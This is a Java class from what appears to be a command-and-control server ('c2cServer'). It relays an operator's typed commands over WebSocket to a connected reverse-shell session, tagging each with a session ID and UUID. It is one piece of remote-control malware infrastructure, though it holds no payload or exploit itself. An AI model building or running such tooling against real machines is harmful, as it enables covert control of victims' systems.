package com.mtattab.c2cServer.service.commands.connected;

import com.mtattab.c2cServer.model.json.shell.ManagerCommunicationModel;
import com.mtattab.c2cServer.service.Command;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import jakarta.annotation.Nullable;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.util.List;
import java.util.UUID;

@Slf4j
public class DefualtConnectedCommand implements Command {
    @Override
    public void execute(List<String> args, WebSocketSession currentSocket) {
        String mangerMessage = DataManipulationUtil.joinListWithDelimiter(args," ");

        WebSocketSession targetReverseShellSocket= ConnectionManager.connectedManagerToReverseSessions.get(currentSocket);

        sendCommandToShell(mangerMessage, targetReverseShellSocket, currentSocket, null);

        log.debug("Manager input is: {}",mangerMessage);
    }

    public void sendCommandToShell( String mangerMessage,
                                    WebSocketSession targetReverseShellSocket,
                                    WebSocketSession currentSocket,
                                    @Nullable String uuid ){
        if (uuid == null){uuid=UUID.randomUUID().toString();}

        SocketUtil.sendMessage(targetReverseShellSocket, new TextMessage(
                DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                        .msg(mangerMessage)
                        .masterSessionId(currentSocket.getId())
                        .uuid(uuid)
                        .build()
                )));
    }

}
